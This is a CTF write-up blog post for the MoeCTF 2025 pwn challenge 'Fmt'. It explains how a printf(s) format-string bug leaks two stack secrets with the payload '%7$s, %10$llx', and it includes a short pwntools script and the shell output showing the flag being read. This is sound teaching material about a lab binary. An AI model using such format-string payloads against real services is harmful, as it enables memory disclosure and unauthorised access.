---
title: 'XiDianCTF MoeCTF 2025 PWN Fmt'
date: '2026-09-04T19:00:41+08:00'
lastmod: '2026-09-04T19:00:41+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
The original Chinese article was written by a human and only proofread with generative AI. This English version was translated with AI.
```

[Challenge link](https://ctf.xidian.edu.cn/training/22?challenge=875)

IDA, followed by more IDA.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v4; // [rsp+8h] [rbp-88h]
  char s1[16]; // [rsp+10h] [rbp-80h] BYREF
  char s2[16]; // [rsp+20h] [rbp-70h] BYREF
  char s[88]; // [rsp+30h] [rbp-60h] BYREF
  unsigned __int64 v8; // [rsp+88h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v4 = (char *)malloc(0x20uLL);
  generate(s2, 5LL);
  generate(v4, 5LL);
  puts("Hey there, little one, what's your name?");
  fgets(s, 80, stdin);
  printf("Nice to meet you,");
  printf(s);
  puts("I buried two treasures on the stack.Can you find them?");
  fgets(s1, 8, stdin);
  if ( strncmp(s1, s2, 5uLL) )
    lose();
  puts("Yeah,another one?");
  fgets(s1, 8, stdin);
  if ( strncmp(s1, v4, 5uLL) )
    lose();
  win();
  return 0;
}
```

We need to enter the correct values for `s1` and `v4`.

Both values are located on the stack.

>  As the challenge name suggests, this is a `fmt` challenge.
>
>  We can craft the string `s` to read data from registers or the stack.
>
>  Under the usual calling convention[^1], the first six arguments are passed in registers and the remaining arguments are placed on the stack.
>
>  Because the format string itself is also an argument, only the next five arguments are taken from registers; the rest are read from the stack.

Notice:

>  char *v4; // [rsp+8h] [rbp-88h]

`v4` is located at `rsp + 8`, making it the second value on the stack and the `5 + 2 = 7`th variadic argument consumed by `printf`.

Because `v4` is a pointer, we can read it with `%7$s`.



We use `%10$llx` to read the array.

There is no need for `%9$llx`; eight bytes are enough to hold the five-character string.

The final format string is therefore:

```
%7$s, %10$llx
```



The Pwntools script is:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='error')

io = connect("127.0.0.1", 10355)

io.sendline(b'%7$s, %10$llx')

io.interactive()
```

> For convenience, the script omits the receive and parsing logic.

Output:

```
Hey there, little one, what's your name?
Nice to meet you,zZJcA, 7272766e78
I buried two treasures on the stack.Can you find them?
$ xnvrr
Yeah,another one?
$ zZJcA
You got it!
$ ls
bin
flag
lib
lib32
lib64
libexec
pwn
$ cat flag
moectf{THIS_IS_FLAG}
```

> Here, `v4` is read directly as a string.
>
> We put the `s2` array into `CyberChef`[^2] and apply:
>
> > `From Hex`
> >
> > `Reverse`
> >
> > `To Hexdump`
> >
> > This produces:
> >
> > ```
> > 00000000  78 6e 76 72 72                                   |xnvrr|
> > ```
> >
> > Therefore, the string is `xnvrr`.



[^1]: [x86-64 calling convention](https://zh.wikipedia.org/wiki/X86%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A#x86-64%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A)
[^2]:[CyberChef](https://gchq.github.io/CyberChef/)
